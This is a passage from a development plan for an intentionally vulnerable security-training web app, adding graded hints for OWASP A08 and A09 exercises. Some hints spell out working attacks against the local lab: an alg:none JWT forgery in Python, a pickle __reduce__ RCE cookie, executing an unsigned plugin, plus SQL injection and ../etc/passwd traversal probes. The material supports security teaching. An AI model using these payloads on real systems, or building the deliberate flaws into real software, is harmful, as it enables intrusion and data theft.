                    "This token's verifier decides HOW to check the signature based on something inside the token itself. What happens if the token gets to choose 'don't check anything'?",
                    "The verifier reads the algorithm to use from the token's own header field rather than always expecting one fixed algorithm — an attacker who crafts their own header controls how their own token gets verified.",
                    "Build a token with header {\"alg\": \"none\", \"typ\": \"JWT\"} and a payload claiming an admin role, base64url-encode each part, and join them with dots — but leave the signature segment empty, since alg:none means no signature is checked at all.",
                    "In Python: header = b64url(json.dumps({'alg':'none','typ':'JWT'}).encode()); payload = b64url(json.dumps({'user':'attacker','role':'admin'}).encode()); submit f'{header}.{payload}.' (note the trailing dot — empty signature) to the admin API form. The verifier sees alg:none in the header and skips verification entirely, exactly as instructed.",
                ],
            ),
            ExampleNav(
                id="cart-pickle-rce",
                title="Pickle Deserialization RCE",
                group="Insecure Deserialization",
                difficulty="Hard",
                endpoint="a08_integrity_failures.cart_rce_demo",
                hints=[
                    "The Easy-tier cart example proved you can tamper with pickled data. Pickle's real danger goes deeper than data tampering — what does a Python object's __reduce__ method control during unpickling?",
                    "__reduce__ tells pickle 'to reconstruct me, call this function with these arguments' — and pickle calls that function the moment pickle.loads() runs, on the server, not in your own process.",
                    "Define a class whose __reduce__ method returns a tuple of (some_callable, (args,)) — when the server deserializes an instance of that class from your cookie, it calls that function with those arguments as part of loading, not construction.",
                    "This page already plants a crafted cookie for you (its raw value is shown in the exploitation section), built from a class whose __reduce__ returns (write_rce_proof, (\"PWNED-VIA-PICKLE-RCE\",)). Simply visit /a08/cart next — the same vulnerable deserialize_cart() from the Easy-tier example processes your cookie, and the function call inside __reduce__ genuinely executes, confirmable on the RCE Proof page.",
                ],
            ),
            ExampleNav(
                id="plugin-marketplace-rce",
                title="Unsigned Plugin Installation Leads to RCE",
                group="Unsigned Software Updates & Supply Chain",
                difficulty="Hard",
                endpoint="a08_integrity_failures.plugin_marketplace_rce_demo",
                hints=[
                    "The Medium-tier plugin-marketplace example proved the marketplace installs unverified content. This route doesn't just display what it fetches though — check what it actually does with the plugin source after downloading it.",
                    "'Installing' a plugin here means calling exec() on its fetched source immediately, with no checksum check — so installing isn't just trusting untrusted content, it's running it with full application privileges.",
                    "Install the substituted plugin demo (http://127.0.0.1:5000/a08/plugin-marketplace/malicious-plugin-demo.py) at /a08/plugin-marketplace exactly as in the Medium-tier example — its source contains a call that writes an RCE proof, and because installing means executing, that call genuinely runs. Confirm it on the RCE Proof page.",
                ],
            ),
        ],
    )
)
```

- [ ] **Step 4: Run test to verify it passes**

Run: `.venv/bin/pytest tests/test_a08_hints.py -v`
Expected: PASS (1 passed)

- [ ] **Step 5: Run the full test suite**

Run: `.venv/bin/pytest tests/ -q`
Expected: all pass (448 baseline from Task 9 + 1 new = 449).

- [ ] **Step 6: Commit**

```bash
git add app/categories/a08_integrity_failures/__init__.py tests/test_a08_hints.py
git commit -m "feat(scoring): author hints for A08 examples

Co-Authored-By: Claude Sonnet 5 <noreply@anthropic.com>"
```

---

## Task 11: A09 Hints — Security Logging and Monitoring Failures (6 examples)

**Files:**
- Modify: `app/categories/a09_logging_monitoring_failures/__init__.py`
- Test: `tests/test_a09_hints.py`

**Interfaces:**
- Consumes: `ExampleNav.hints` field (Task 1).
- Produces: nothing consumed by later tasks.

- [ ] **Step 1: Write the failing shape test**

Create `tests/test_a09_hints.py`:

```python
from app.core.nav import CATEGORIES


def test_a09_examples_have_well_formed_hint_sequences():
    a09 = next(c for c in CATEGORIES if c.id == "a09_logging_monitoring_failures")
    assert len(a09.examples) == 6
    for example in a09.examples:
        assert 3 <= len(example.hints) <= 5, f"{example.id} has {len(example.hints)} hints"
        assert all(hint.strip() for hint in example.hints), f"{example.id} has an empty hint"
        assert len(set(example.hints)) == len(example.hints), f"{example.id} has duplicate hints"
```

- [ ] **Step 2: Run test to verify it fails**

Run: `.venv/bin/pytest tests/test_a09_hints.py -v`
Expected: FAIL — every example currently has `hints == []`.

- [ ] **Step 3: Add hints to each `ExampleNav`**

Modify `app/categories/a09_logging_monitoring_failures/__init__.py`. Current
file:

```python
from flask import Blueprint

a09_bp = Blueprint(
    "a09_logging_monitoring_failures",
    __name__,
    template_folder="templates",
    url_prefix="/a09",
)

from app.categories.a09_logging_monitoring_failures import routes  # noqa: E402,F401
from app.core.nav import CATEGORIES, CategoryNav, ExampleNav  # noqa: E402

CATEGORIES.append(
    CategoryNav(
        id="a09_logging_monitoring_failures",
        short_id="A09",
        title="Security Logging and Monitoring Failures",
        blurb="Auditable events go unrecorded, logs leak sensitive data or sit exposed to anyone, and nothing ever alerts on an attack already in progress.",
        blueprint_name="a09_logging_monitoring_failures",
        overview_endpoint="a09_logging_monitoring_failures.overview",
        examples=[
            ExampleNav(
                id="failed-logins-not-logged",
                title="Failed Login Attempts Never Logged",
                group="Missing Audit Logging",
                difficulty="Easy",
                endpoint="a09_logging_monitoring_failures.login",
            ),
            ExampleNav(
                id="admin-action-no-audit",
                title="High-Value Admin Action With No Audit Trail",
                group="Missing Audit Logging",
                difficulty="Medium",
                endpoint="a09_logging_monitoring_failures.admin_actions",
            ),
            ExampleNav(
                id="sensitive-data-in-logs",
                title="Sensitive Data Leaked Into Log Files",
                group="Insecure Log Storage",
                difficulty="Easy",
                endpoint="a09_logging_monitoring_failures.support_login",
            ),
            ExampleNav(
                id="log-file-world-readable",
                title="Unauthenticated Log File Exposure",
                group="Insecure Log Storage",
                difficulty="Hard",
                endpoint="a09_logging_monitoring_failures.log_exposure_demo",
            ),
            ExampleNav(
                id="no-alert-threshold",
                title="No Alert Threshold for Repeated Failures",
                group="No Detection & Alerting for Active Attacks",
                difficulty="Medium",
                endpoint="a09_logging_monitoring_failures.monitored_login",
            ),
            ExampleNav(
                id="attack-signature-not-flagged",
                title="Attack Signature Logged But Never Flagged",
                group="No Detection & Alerting for Active Attacks",
                difficulty="Hard",
                endpoint="a09_logging_monitoring_failures.product_search",
            ),
        ],
    )
)
```

Replace it in full with:

```python
from flask import Blueprint

a09_bp = Blueprint(
    "a09_logging_monitoring_failures",
    __name__,
    template_folder="templates",
    url_prefix="/a09",
)

from app.categories.a09_logging_monitoring_failures import routes  # noqa: E402,F401
from app.core.nav import CATEGORIES, CategoryNav, ExampleNav  # noqa: E402

CATEGORIES.append(
    CategoryNav(
        id="a09_logging_monitoring_failures",
        short_id="A09",
        title="Security Logging and Monitoring Failures",
        blurb="Auditable events go unrecorded, logs leak sensitive data or sit exposed to anyone, and nothing ever alerts on an attack already in progress.",
        blueprint_name="a09_logging_monitoring_failures",
        overview_endpoint="a09_logging_monitoring_failures.overview",
        examples=[
            ExampleNav(
                id="failed-logins-not-logged",
                title="Failed Login Attempts Never Logged",
                group="Missing Audit Logging",
                difficulty="Easy",
                endpoint="a09_logging_monitoring_failures.login",
                hints=[
                    "Log in successfully first and check the security event log — a new entry appears immediately. Now think about the OTHER branch of a login form: what happens when the credentials are wrong?",
                    "Submit one wrong password at /a09/login. Does anything new show up in the security event log afterward?",
                    "Submit 10 or more wrong passwords in a row at /a09/login, then check /a09/security-events — the event count never moves at all. The failure branch never calls log_security_event(), so repeated failed logins leave zero trace for an operator to ever notice.",
                ],
            ),
            ExampleNav(
                id="admin-action-no-audit",
                title="High-Value Admin Action With No Audit Trail",
                group="Missing Audit Logging",
                difficulty="Medium",
                endpoint="a09_logging_monitoring_failures.admin_actions",
                hints=[
                    "Creating a user here logs an event correctly. Now try the OTHER, more destructive action this page offers — does it get the same treatment?",
                    "Delete an existing user from the list at /a09/admin-actions, then check whether the security event log gained a new entry for that action.",
                    "Delete a user at /a09/admin-actions, then check /a09/security-events — the user is genuinely gone from the list, but no event was ever logged for the deletion. The 'delete' branch never calls log_security_event(), unlike the 'create' branch right above it in the same function.",
                ],
            ),
            ExampleNav(
                id="sensitive-data-in-logs",
                title="Sensitive Data Leaked Into Log Files",
                group="Insecure Log Storage",
                difficulty="Easy",
                endpoint="a09_logging_monitoring_failures.support_login",
                hints=[
                    "This support login form fails on purpose with a wrong password. Where does that failure get recorded, and exactly what does it write down?",
                    "Failed attempts here are written to the app's own log file through a helper that formats the submitted username AND password directly into the log line, unescaped.",
                    "Submit any password (make it memorable) at /a09/support-login, then view the raw log via /a09/security-events — the password you typed appears in plaintext, sitting in a file meant for operational diagnostics, not credential storage.",
                ],
            ),
            ExampleNav(
                id="log-file-world-readable",
                title="Unauthenticated Log File Exposure",
                group="Insecure Log Storage",
                difficulty="Hard",
                endpoint="a09_logging_monitoring_failures.log_exposure_demo",
                hints=[
                    "Visiting this page plants another secret into the shared application log file. Now think about who's actually allowed to READ that file back.",
                    "There's a dedicated route that serves the raw log file's full contents. Check what access control, if any, it enforces before handing the file over.",
                    "Fetch that log-download route directly in a fresh incognito window or with curl — no login, no cookie, nothing.",
                    "curl http://127.0.0.1:5000/a09/download-log — the entire raw log downloads with zero authentication, including any plaintext credentials logged by the 'Sensitive Data Leaked Into Log Files' example (visit /a09/log-exposure-demo first for a freshly planted secret).",
                ],
            ),
            ExampleNav(
                id="no-alert-threshold",
                title="No Alert Threshold for Repeated Failures",
                group="No Detection & Alerting for Active Attacks",
                difficulty="Medium",
                endpoint="a09_logging_monitoring_failures.monitored_login",
                hints=[
                    "Every login attempt here genuinely IS logged, unlike the very first example in this category. So what's actually missing — think about what should happen once a pattern of failures repeats.",
                    "Submit several wrong passwords in a row at /a09/monitored-login and watch the security event log fill up correctly. Now look at the 'Active Alerts' count on that same page.",
                    "Submit 20 or more consecutive wrong passwords at /a09/monitored-login. All 20 attempts show up individually in the event log — correct, complete data — but 'Active Alerts' never leaves 0. Nothing anywhere counts failures per user or raises an alert once a threshold like 5 is crossed.",
                ],
            ),
            ExampleNav(
                id="attack-signature-not-flagged",
                title="Attack Signature Logged But Never Flagged",
                group="No Detection & Alerting for Active Attacks",
                difficulty="Hard",
                endpoint="a09_logging_monitoring_failures.product_search",
                hints=[
                    "This search box logs every query verbatim — true, working detection, unlike some other examples here. The gap is one step further downstream: what should happen once a LOGGED query looks like an attack?",
                    "Search for something that's unmistakably an attack probe, not just an ordinary product name, and check what 'Active Alerts' shows on the security event log page afterward.",
                    "Search for ' OR '1'='1' -- (a classic SQL injection probe) or ../../../../etc/passwd (path traversal) at /a09/product-search?q=... — the exact string gets logged faithfully, but nothing in this app ever pattern-matches logged queries against known attack signatures, so 'Active Alerts' stays at 0 no matter how obvious the signal already sitting in the log is.",
                ],
            ),
        ],
    )
)
```

- [ ] **Step 4: Run test to verify it passes**

Run: `.venv/bin/pytest tests/test_a09_hints.py -v`
Expected: PASS (1 passed)

- [ ] **Step 5: Run the full test suite**

Run: `.venv/bin/pytest tests/ -q`
Expected: all pass (449 baseline from Task 10 + 1 new = 450).

- [ ] **Step 6: Commit**

```bash
git add app/categories/a09_logging_monitoring_failures/__init__.py tests/test_a09_hints.py
git commit -m "feat(scoring): author hints for A09 examples

Co-Authored-By: Claude Sonnet 5 <noreply@anthropic.com>"
```

---

## Task 12: Final Integration — Cross-Category Sanity Test, README, Full Verification

**Files:**
- Create: `tests/test_all_examples_have_hints.py`
- Modify: `README.md`

**Interfaces:**
- Consumes: `ExampleNav.hints` fully populated across all 63 examples by
  Tasks 1-11.

- [ ] **Step 1: Write the failing cross-category sanity test**

Create `tests/test_all_examples_have_hints.py`:

```python
from app.core.nav import CATEGORIES


def test_every_example_across_every_category_has_a_well_formed_hint_sequence():
    total = 0
    for category in CATEGORIES:
        for example in category.examples:
            total += 1
            assert 3 <= len(example.hints) <= 5, (
                f"{category.short_id}/{example.id} has {len(example.hints)} hints"
            )
            assert all(hint.strip() for hint in example.hints), (
                f"{category.short_id}/{example.id} has an empty hint"
            )
            assert len(set(example.hints)) == len(example.hints), (
                f"{category.short_id}/{example.id} has duplicate hints"
            )
    assert total == 63
```

- [ ] **Step 2: Run test to verify it passes**

This test should already pass at this point — every category task (1-11)
already added real hints to every one of its examples. Run:

Run: `.venv/bin/pytest tests/test_all_examples_have_hints.py -v`
Expected: PASS (1 passed). If it fails, some earlier task's `ExampleNav`
entry is missing a `hints=[...]` argument — find which category/example
the failure message names and go back to that task's file to add it
before proceeding.

- [ ] **Step 3: Update README.md's Settings section**

Read the current `README.md` fresh before editing (wording may have
drifted slightly). Find this section:

```markdown
## Settings

Visit **Settings** in the top nav to:

- Toggle whether example pages show their **Explanation** text.
- Toggle whether example pages show step-by-step **Exploitation** instructions.
- **Reset the lab** to its clean seeded state (useful between training sessions or
  between developers sharing the same instance).

Both toggles are global and stored in the database — they affect every example page
immediately for every visitor. Hiding the teaching text never disables the underlying
vulnerability; it only conceals the walkthrough, so you can attempt exploitation blind.
```

Replace it with (adding the new scoring toggle as a fourth bullet, and a
paragraph explaining the scoring/hints mechanism and its interaction with
the exploit-instructions toggle; the existing "Both toggles are global..."
sentence becomes "All toggles are global..." to stay accurate now that
there are three, not two):

```markdown
## Settings

Visit **Settings** in the top nav to:

- Toggle whether example pages show their **Explanation** text.
- Toggle whether example pages show step-by-step **Exploitation** instructions.
- **Enable the scoring system** — award points on completion (30 Hard / 20 Medium /
  10 Easy), reduced by however many progressive hints you request first.
- **Reset the lab** to its clean seeded state (useful between training sessions or
  between developers sharing the same instance).

All toggles are global and stored in the database — they affect every example page
immediately for every visitor. Hiding the teaching text never disables the underlying
vulnerability; it only conceals the walkthrough, so you can attempt exploitation blind.

When the scoring system is enabled, step-by-step exploitation instructions are always
hidden (regardless of the exploit-instructions toggle's own setting) — hints become the
only guidance mechanism. Each example offers 3-5 hints, from a vague nudge toward the
right technique to a fully explicit payload; each hint you reveal permanently reduces
the points that example can award once you mark it done, and points are locked in at
the moment you do. Your running score is shown in the top nav and on the home page.
```

- [ ] **Step 4: Fix the stale "Stats" reference in README.md's "More pages" section**

Find this section (the `/stats` page it describes was removed earlier this
session — progress is now shown on the home page instead, and this
bullet was never updated to reflect that):

```markdown
## More pages

- **Stats** (`/stats`) — your progress across every example, overall and per
  category. Progress is global and shared by every visitor to this instance —
  marking an example "done" updates what everyone sees here, the same way the
  Settings toggles above are shared, not per-browser.
- **Tools** (`/tools`) — what tools are useful for which kinds of exercises, with
  download links.
- **About** (`/about`) — what this app is, its infrastructure, and its safety model.
- A 🌓 **Theme** button in the top nav toggles dark mode; the choice is remembered
  per browser.
```

Replace the first bullet with:

```markdown
## More pages

- **Home** (`/`) — your progress across every example, overall and per category,
  plus your running score when the scoring system is enabled. Progress is global
  and shared by every visitor to this instance — marking an example "done" updates
  what everyone sees here, the same way the Settings toggles above are shared, not
  per-browser.
- **Tools** (`/tools`) — what tools are useful for which kinds of exercises, with
  download links.
- **About** (`/about`) — what this app is, its infrastructure, and its safety model.
- A 🌓 **Theme** button in the top nav toggles dark mode; the choice is remembered
  per browser.
```

- [ ] **Step 5: Run the full test suite**

Run: `.venv/bin/pytest tests/ -q`
Expected: all pass. Baseline before this plan was 423. This plan's new
tests: 4 (Task 1, `test_scoring.py`) + 13 (Task 1, `test_hints.py`) + 1
(Task 2) + 1 (Task 3) + 1 (Task 4) + 1 (Task 5) + 1 (Task 6) + 1 (Task 7)
+ 1 (Task 8) + 1 (Task 9) + 1 (Task 10) + 1 (Task 11) + 1 (Task 12) = 28
new tests, 0 net removed (`test_progress.py`'s one changed test replaces,
not adds) → 451 total.

- [ ] **Step 6: Commit**

```bash
git add tests/test_all_examples_have_hints.py README.md
git commit -m "docs(scoring): update README for the scoring system, fix stale stats-page reference

Co-Authored-By: Claude Sonnet 5 <noreply@anthropic.com>"
```

No live browser verification is needed for this plan — every mechanism
(points formula, hint reveal/freeze semantics, settings interaction, nav
bar and home page score display) is fully exercisable through the real
Flask test client, and every hint's factual content was drafted against a
fresh reading of that example's own route and template source, following
the same faithfulness standard used throughout this session's prior
sub-projects.
